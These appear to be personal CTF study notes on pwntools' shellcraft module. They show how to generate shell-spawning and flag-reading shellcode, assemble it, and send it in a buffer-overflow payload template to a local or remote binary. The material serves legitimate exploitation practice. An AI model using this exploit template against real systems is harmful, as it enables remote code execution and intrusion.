# Shellcraft & pwntools Notes (pwn CTF)

**shellcraft** is pwntools' built-in shellcode generator — instead of hand-writing assembly, you call a Python function and get ready-made shellcode (spawn a shell, read a file, etc), with problem bytes already avoided for you.

---

## <span style="color:rgb(146, 208, 80)">The Goal:</span>

Tell pwntools your target architecture ↓ Ask shellcraft for the shellcode you need ↓ Assemble it into raw bytes with `asm()` ↓ Send it as your payload ↓ Get flag

---

### <span style="color:rgb(146, 208, 80)">1- Setup</span>

```python
from pwn import *

context.arch = 'amd64'   # or 'i386', 'arm', ...
context.os   = 'linux'
```

---

### <span style="color:rgb(146, 208, 80)">2- Common shellcraft functions</span>

```python
shellcraft.sh()                       # spawns /bin/sh
shellcraft.cat('/flag')               # open + sendfile a file to stdout (no shell needed)
```

`shellcraft.cat()` is the auto-generated version of the open→sendfile pattern from your Shellcoding notes — use it when there's no interactive shell available.

If neither premade function fits (e.g. you need a specific syscall), build it manually — still byte-safe automatically:

```python
shellcode  = shellcraft.pushstr('/flag')          # push a string, no null bytes
shellcode += shellcraft.syscall('SYS_open', 'rsp', 0)   # call open() on it
```

---

### <span style="color:rgb(146, 208, 80)">3- Turning shellcraft output into bytes</span>

`shellcraft.*` returns **assembly text**, not raw bytes — assemble it with `asm()`:

```python
raw_bytes = asm(shellcraft.sh())
```

---

### <span style="color:rgb(146, 208, 80)">4- Sending it to the target</span>

```python
p = process('./binary')       # local
# p = remote('host', 1337)    # remote CTF

payload  = b"A" * offset          # junk to reach return address
payload += p64(shellcode_addr)    # redirect execution into your shellcode
payload += asm(shellcraft.sh())   # the shellcode itself

p.send(payload)
p.interactive()
```

---

## <span style="color:rgb(146, 208, 80)">Things that go wrong:</span>

|PROBLEM|FIX|
|---|---|
|`NameError: shellcraft not defined`|Use `from pwn import *`, not `import pwn`|
|Wrong architecture bytes generated|Set `context.arch` / `context.os` **before** calling `shellcraft`/`asm`|
|Sent the wrong thing|`shellcraft.sh()` alone is assembly text — you must wrap it in `asm()` before sending|
|Want to see what it actually generated|`print(shellcraft.sh())` to view the raw assembly before assembling|